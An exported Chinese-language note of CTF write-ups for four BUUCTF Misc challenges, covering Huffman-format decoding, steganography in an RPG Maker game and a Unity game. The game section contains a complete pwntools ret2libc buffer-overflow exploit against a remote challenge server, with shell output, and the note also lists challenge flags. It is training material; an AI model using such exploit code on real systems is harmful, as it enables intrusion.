<html>
<head>
  <title>BUUCTF Misc 40（205-208）</title>
  <basefont face="微软雅黑" size="2" />
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
  <meta name="exporter-version" content="YXBJ Windows/605894 (zh-CN, DDL); Windows/6.1.1 (Win64); EDAMVersion=V2;"/>
  <style>
    body, td {
      font-family: 微软雅黑;
      font-size: 10pt;
    }
  </style>
</head>
<body>
<a name="898"/>
<h1>BUUCTF Misc 40（205-208）</h1>
<h2><a href="https://DemonStarAlgol.github.io/Misc/">[无关链接]</a></h2>

<div>
<span><div><span style="font-weight: bold;">205 [SUCTF 2019]Guess Game</span></div><div><br/></div><div>猜数字游戏，题目给出客户端和服务端。游戏总共进行10轮，每次从0-10总共11个数字猜测1个，10轮全部猜中就能得到flag。主要考察的是对pickle模块序列化的了解……<span style="font-size: unset; color: unset; font-family: unset;">做不来，告辞！</span></div><div><br/></div><div>Writeup：<a href="https://cloud.tencent.com/developer/article/1523852">https://cloud.tencent.com/developer/article/1523852</a></div><div><br/></div><div>flag：本题是动态flag，每次生成靶机flag都不一样……</div><div><br/></div><div><span style="font-weight: bold;">206 [BJDCTF 2nd]Strenuous_Huffman</span></div><div>题目：DreamJack同学最近在学习数据结构，他没事干写了一个压缩软件，准备交给老师当大作业用。。他用哈夫曼树，二叉堆，位图，和字典树实现了软件的压缩部分。可是他不想写这个软件的解压缩部分，太懒了。今天DreamerJack同学给你发来了一个神秘的whereIsMyFlag.jzpk文件，你能破解这个文件吗？</div><div><br/></div><div>下载得到whereIsMyFlag.jzpk和jzpk.txt。后者的内容：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>.jzpk文件，即Jack ZIP Package文件，为DreamerJack同学开发的新型压缩文件格式。</div><div>其文件结构如下定义所述：</div><div>头部8Byte，描述该压缩文件数据段所占比特数目(Bit)。</div><div>剩下的全是数据段，数据段中的数据以**比特**为最小单位。</div><div><br/></div><div>数据段：</div><div>首先是哈夫曼树字典信息：</div><div>for(int i=0;i&lt;256;i++){</div><div>    占用8Bit空间的整形i_len：指明原文件中值为i的单个字节（8Bit）被压缩后占用几个比特空间</div><div>    占用i_len Bit空间的01二进制串：指明原文件中值为i的单个字节被哈夫曼树压缩后的新编码</div><div>}</div><div>接下来全是用哈夫曼树压缩后的新编码表示的信息.一个比特紧邻一个比特连续不断</div><div><br/></div><div>举例：</div><div>假设我有一哈夫曼树，对于整个文件中每个字节有256种可能的组合，我其中只有两种字节在文件中存在：</div><div>假设经压缩后长度变化为3Bit。</div><div>00000001，压缩后为001.</div><div>00000000，压缩后为000.</div><div>假设其他的254种字节都没有编码表示</div><div>（此处仅举例用）</div><div>假设要存储数据10，那么压缩后的数据为001000，长度为6</div><div>哈夫曼树字典信息为（为查看方便加上空格和换行，实际上空格和换行在二进制文件中并不存在，而且所有0和1都以二进制形式表示）</div><div>00000011 000</div><div>00000011 001</div><div>00000000</div><div>00000000</div><div>...以此类推 直到256种字节都表示完毕为止（后面还会有(256-4)*8个0）字典信息长度为2054</div><div>头部8Byte，指示数据段长度，值为2060的long long，长度为8</div><div>那么这个文件共8+2054+6个字节。顺序为头部+哈夫曼树字典+压缩后的信息</div><div><br/></div><div>备注：所有整型变量均采用小端法存储。</div></div><div><br/></div><div>根据题意，whereIsMyFlag.jzpk头部8字节是小端序存储的文件大小（以Bit为单位），本题中为09 CB即2507 Bit。</div><div>从第9字节开始，需要转为二进制读取。根据题目给出的哈夫曼树字典说明，得到0-255共256种字节对应的压缩编码。对每种字节，先读取8 Bit的数据，转十进制后得到其压缩编码的长度，再按长度读取其压缩编码。最后得到256中字节对应压缩编码的字典（可能有部分字节不存在对应的压缩编码，即编码长度为0）。</div><div>读取完字典后剩余的部分即为压缩数据，根据字典进行替换即可。<span style="font-size: unset; color: unset; font-family: unset;">由于哈夫曼编码的原理要求压缩编码满足唯一编码，即不可能存在两种压缩编码，其中之一是另外一个的前段部分。因此也可以构造一个字典二叉树，逐位向下查找。二叉树的任一节点必然属于“有子节点”和“无子节点”两种状态之一，由于</span><span style="font-size: unset; color: unset; font-family: unset;">唯一编码性质，每个无子节点的节点必然对应0-255中的一种字节。因而可以减少算法的复杂度。</span></div><div><span style="font-size: unset;"><br/></span></div><div><span style="font-size: unset; color: unset; font-family: unset;">完成以上步骤后，将得到的字节转为ASCII码，得到：</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>QkpEe2p6cGtfRjFsRV9GMHJNYXRfMXNfYmV0dGVyX1RoQW5fUkFSfQ==</div></div><div>base64转码得到flag。</div><div><br/></div><div>本题可以参考以下Writeup：</div><div><a href="https://www.cnblogs.com/zhwer/p/12550560.html">https://www.cnblogs.com/zhwer/p/12550560.html</a></div><div>以及原作者兼出题人对该压缩算法代码的开源：</div><div><a href="https://github.com/bjrjk/JackZIPPacker">https://github.com/bjrjk/JackZIPPacker</a></div><div><br/></div><div>flag：BJD{jzpk_F1lE_F0rMat_1s_better_ThAn_RAR}</div><div><br/></div><div><span style="font-weight: bold;">207 [2020 新春红包题]2</span></div><div><br/></div><div>下载得到文件夹“BrainOverFlow Vol.1 BUU特供”。内容为一个用RPG Maker MV做的游戏。</div><div>用RPG Maker MV新建游戏工程，然后将游戏目录下www文件夹中内容复制到新工程内覆盖，即可从Game.rpgproject打开游戏工程。</div><div><br/></div><div>游戏开始地点为地图001:BEGIN的(8,6)坐标。顺着事件往下找，第一段flag出现在地图015:MON1_2的(37,25)处：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image.png" type="image/png" data-filename="Image.png"/></div><div>得到第一段flag：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>flag{812fc020</div></div><div>也可以正面做，把玩家初始位置设置到该事件下方，测试游戏，与NPC对话，显示一张图片：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [1].png" type="image/png" data-filename="Image.png"/></div><div>游戏目录下的secret文件夹里的1.png与该图片内容很接近，Stegsolve打开1.png，在Blue plane发现大量纵横虚线：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [2].png" type="image/png" data-filename="Image.png"/></div><div>显然是盲水印，注意到游戏截图中并没有这些虚线，因此游戏中得到的是原图，1.png是加水印后的图。从截图中将原图提取出来（这里有个坑，如果Windows显示设置有缩放的话务必先调整回100%再截图，否则图片大小会不一致）：</div><div><img src="BUUCTF Misc 40（205-208）_files/image1.png" type="image/png" data-filename="image1.png"/></div><div><span style="font-size: unset; color: unset; font-family: unset;">再用盲水印脚本处理：</span></div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop/blind-watermark-python3/BlindWaterMark# python bwm.py decode 1.png image1.png res.png</div><div>image&lt;1.png&gt; + image(encoded)&lt;image1.png&gt; -&gt; watermark&lt;res.png&gt;</div></div><div>这里调整了原图和水印图的顺序，使得输出结果更容易识别：</div><div><img src="BUUCTF Misc 40（205-208）_files/res.png" type="image/png" data-filename="res.png"/></div><div>得到268450，在NPC对话中输入即可得到flag。</div><div><br/></div><div>按照游戏流程（而非地图排列顺序，事实上按地图编号顺序也可以，看得出来制作者应该是边做流程边添加新地图的），第二段flag出现在地图013:MON3_3的(23,25)处：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [3].png" type="image/png" data-filename="Image.png"/></div><div>得到第二段flag：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>bf951943</div></div><div>正面做法，在游戏里触发这个事件：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [4].png" type="image/png" data-filename="Image.png"/></div><div>同样找到secret文件夹下的3.png，用zsteg找到LSB隐写信息：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# zsteg 3.png</div><div>imagedata           .. file: Apple DiskCopy 4.2 image \032, 33554176 bytes, 0xff00 tag size, GCR CLV ssdd (400k), 0x0 format</div><div>b1,rgb,lsb,xy       .. <font color="#FF0000">text: &quot;the flag is 753951m&quot;</font></div><div>b2,rgb,lsb,xy       .. file: PGP Secret Sub-key -</div><div>b4,r,lsb,xy         .. text: &quot;#3EUUUUUUUVx&quot;</div><div>b4,r,msb,xy         .. text: &quot;]UUUUUUUUU&quot;</div><div>b4,g,lsb,xy         .. file: a.out VAX demand paged (first page unmapped) pure executable</div><div>b4,b,lsb,xy         .. text: &quot;eTVdC4DDDUUVg&quot;</div><div>b4,b,msb,xy         .. text: &quot;wwwwww;33333&quot;</div></div><div>在NPC对话中输入753951即可得到flag。</div><div><br/></div><div>第三段flag出现在地图022:MON2_4的(19,9)处：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [5].png" type="image/png" data-filename="Image.png"/></div><div>得到第三段flag：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>09ceab2f</div></div><div>正面做法，在游戏里触发这个事件：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [6].png" type="image/png" data-filename="Image.png"/></div><div>很明显是标准银河字母（The Standard Galactic Alphabet）：</div><div><img src="BUUCTF Misc 40（205-208）_files/0b46f21fbe096b637b4ad9f00b338744ebf8ac3b.jpg" type="image/jpeg" data-filename="0b46f21fbe096b637b4ad9f00b338744ebf8ac3b.jpg"/></div><div>转码得到：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>flagisgeydgnha</div></div><div>没有任何意义，猜测有没有可能图片未显示完全。在事件里把图片缩放率改为50%：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [7].png" type="image/png" data-filename="Image.png"/></div><div>再次触发事件：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [8].png" type="image/png" data-filename="Image.png"/></div><div>得到完整信息：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>flagisgeydgnjuha</div></div><div>然后将GEYDGNJUHA进行base32转码，得到103548，在NPC对话中输入即可得到flag。</div><div><br/></div><div>最后的flag在游戏结局部分，首先在地图039:Control的(8,3)处可以得到通关密钥：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [9].png" type="image/png" data-filename="Image.png"/></div><div>但密钥并不是flag，和(3,9)处的NPC对话可以得知正常获得密钥需要解决一道Pwn题：</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [10].png" type="image/png" data-filename="Image.png"/></div><div>Pwn题用到的ELF程序也在secret文件夹下，文件名为Protect。参考官方<a href="https://www.bilibili.com/video/BV1Hv411z75h">Writeup</a>构造如下exp：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>from pwn import *</div><div><br/></div><div># context.log_level = 'debug'</div><div>p = remote('123.206.21.178', 10000)</div><div># p = process('./protect')</div><div><br/></div><div>elf = ELF('./protect')</div><div>libc = ELF('./libc-2.23.so')</div><div># libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</div><div><br/></div><div>pop_rdi = 0x0400a43</div><div>main_addr = 0x040094b</div><div><br/></div><div>libcstart_got = elf.got['__libc_start_main']</div><div>puts_plt = elf.plt['puts']</div><div><br/></div><div>p.recvuntil('Enter your options\n')</div><div>p.sendline('1')</div><div><br/></div><div>p.recvuntil(&quot;Please Input The Administrator's Password.\n&quot;)</div><div>payload = 'a'*72 + p64(pop_rdi) + p64(libcstart_got) +p64(puts_plt) + p64(main_addr)</div><div>p.sendline(payload)</div><div><br/></div><div>p.recvuntil('Login fail!\n')</div><div>libcstart_addr = u64(p.recv(6).ljust(8, &quot;\x00&quot;))</div><div># print hex(libcstart_addr)</div><div>libc_base = libcstart_addr - libc.symbols['__libc_start_main']</div><div># print hex(libc_base)</div><div><br/></div><div>p.recvuntil('Enter your options\n')</div><div>p.sendline('1')</div><div><br/></div><div>system_addr = libc_base + libc.symbols['system']</div><div>binsh_addr = libc_base + next(libc.search('/bin/sh\x00'))</div><div>payload = 'a' * 72 + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)</div><div><br/></div><div>p.recvuntil(&quot;Please Input The Administrator's Password.\n&quot;)</div><div>p.sendline(payload)</div><div><br/></div><div>p.interactive()</div></div><div>注意点在于使用的libc要和服务器一致，经过逐个试验后确定应该使用Ubuntu 16的64位libc-2.23.so，可以在BUUCTF的<a href="https://buuoj.cn/resources">resources页面</a>下载到。运行exp：</div><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div>root@kali:~/Desktop# python exp.py</div><div>[+] Opening connection to 123.206.21.178 on port 10000: Done</div><div>[*] '/root/Desktop/protect'</div><div>    Arch:     amd64-64-little</div><div>    RELRO:    Partial RELRO</div><div>    Stack:    No canary found</div><div>    NX:       NX enabled</div><div>    PIE:      No PIE (0x400000)</div><div>[*] '/root/Desktop/libc-2.23.so'</div><div>    Arch:     amd64-64-little</div><div>    RELRO:    Partial RELRO</div><div>    Stack:    Canary found</div><div>    NX:       NX enabled</div><div>    PIE:      PIE enabled</div><div>[*] Switching to interactive mode</div><div>Login fail!</div><div>$ ls</div><div>bin</div><div>buufile</div><div>dev</div><div>flag</div><div>lib</div><div>lib32</div><div>lib64</div><div>password</div><div>pwn</div><div>$ cat flag</div><div>flag{1tsY0urT1cK3t!}</div><div>$ cat password</div><div>65342187</div><div>$ cat buufile</div><div>d27661ac}</div><div>$</div><div>[*] Interrupted</div><div>[*] Closed connection to 123.206.21.178 port 10000</div></div><div>可以看到，flag文件中是提示，password文件中是游戏通关所需密钥，buufile文件中是flag的最后一段。</div><div>最后把四段flag拼接起来得到flag。</div><div><br/></div><div>flag：flag{812fc020bf95194309ceab2fd27661ac}</div><div><br/></div><div><span style="font-weight: bold;">208 [RoarCTF2019]TankGame</span></div><div><br/></div><div>下载得到文件夹TankGameExe，是用Unity编写的坦克大战游戏。</div><div><img src="BUUCTF Misc 40（205-208）_files/Image [11].png" type="image/png" data-filename="Image.png"/></div><div>对于Unity工程，需要用dnspy工具反编译Assembly-CSharp.dll文件来进行分析。不会做，告辞！</div><div><br/></div><div>记录一下Writeup：</div><div><a href="https://blog.csdn.net/Resery/article/details/103013114">https://blog.csdn.net/Resery/article/details/103013114</a></div><div><br/></div><div>flag：RoarCTF{wm-805CEC3545}</div></span>
</div></body></html> 